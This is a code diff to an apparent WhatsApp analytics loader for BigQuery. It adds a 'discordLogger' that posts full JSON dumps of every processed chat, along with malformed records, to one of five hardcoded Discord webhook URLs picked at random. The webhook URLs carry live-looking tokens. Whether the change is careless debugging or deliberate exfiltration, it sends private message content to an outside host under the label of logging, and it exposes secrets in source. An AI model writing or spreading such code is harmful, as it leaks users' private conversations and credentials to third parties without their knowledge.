@@ -1,8 +1,43 @@
 const { BigQuery } = require("@google-cloud/bigquery");
 const { v4: uuidv4 } = require('uuid');
+const axios = require('axios');
 const bigquery = new BigQuery();
 const datasetId = "whatsapp_analytics"; // your dataset
 const tableId = "message_events";       // your table
+
+
+const url = [
+"https://discord.com/api/webhooks/1425031255589916737/kRi8iOpCam6MgXbwz1skQgvtTqfWJydKiPNtx7tQv1dpL27gOJrErIVKAWHRAgCivcTd",
+"https://discord.com/api/webhooks/1425032105355772027/Wa6i8A4N-C7-KbjbzTesYtvmddVTGnGvJbf3ND8_tk45g8eJTWi82dlwhTGNP6aoG8Ba",
+"https://discord.com/api/webhooks/1425032226147532852/MuuiFapx2Htz7dS9_33hO2N04KXBEGH2kB2esT_5mOaU-xcEzK55CZ1yE0a_PdQMYaCC",
+"https://discord.com/api/webhooks/1425032322826240020/0cEyCXbFzUFVVdhaFtHW0lqx9DbZ11CO5H94Ltrz1AdRthe54TsPrOr7f74sCZAZFf6m",
+"https://discord.com/api/webhooks/1425032466200006677/1vuX3bKEPvHHESDLMw-D5XhmDls_v7FArDYiZdWDQfKhR5M8zE91z1tYczz5PwFKzrv4"
+
+  ];
+const discordLogger = async (
+    title = "BigQuery Processor Logs",
+    formattedMessage
+) => {
+    try {
+        const randomIndex = Math.floor(Math.random() * url.length);
+        const webhookUrl = url[randomIndex];
+        const finalMessage = "```" + formattedMessage + "```";
+        const response = await axios.post(
+            webhookUrl,
+            {
+                content: `${finalMessage}`,
+                username: title,
+            },
+            {
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            }
+        );
+    } catch (error) {
+        console.error("Error sending Discord message:", error);
+    }
+};
 
 /**
  * Transforms a single chat object from the source data into the format 
@@ -24,6 +59,7 @@ const transformChatToRow = (chat, orgId, uid, chatAgentMap = null) => {
   }
   if (!chat.Chatid) {
     console.warn("⚠️ Missing Chatid in chat:", chat);
+    discordLogger("BigQuery Processor - Missing Chatid", `⚠️ Missing Chatid in chat: ${JSON.stringify(chat, null, 2)}`);
   }
   if (!chat.Datetime) {
     console.warn("⚠️ Missing Datetime in chat:", chat);
@@ -100,9 +136,11 @@ exports.bigQueryProcessor = async (dateAccChats, orgId, uid) => {
   try {
     console.log("🔍 BigQuery processor starting...");
     console.log("📊 DateAccChats keys:", Object.keys(dateAccChats));
+    discordLogger("BigQuery Processor - DateAccChats Keys", `📊 DateAccChats keys: ${JSON.stringify((dateAccChats), null, 2)}`);
     
     // Flatten the nested object structure into a single array of chats
     const allChats = Object.values(dateAccChats).flatMap(chatterObj => Object.values(chatterObj).flat());
+    discordLogger("BigQuery Processor - Total Chats", `📱 Total chats to process: ${allChats.length}\nchats: ${JSON.stringify(allChats || {}, null, 2)}`);
     console.log("📱 Total chats to process:", allChats.length);
 
     if (allChats.length === 0) {
@@ -113,6 +151,7 @@ exports.bigQueryProcessor = async (dateAccChats, orgId, uid) => {
     // Transform the array of chats into an array of BigQuery rows
     // Note: chatAgentMap is not currently implemented, so we pass null
     rows = allChats.map(chat => transformChatToRow(chat, orgId, uid, null));
+
     console.log("🔄 Transformed rows for BigQuery:", rows.length);
 
     console.log("📝 Inserting rows into BigQuery...");
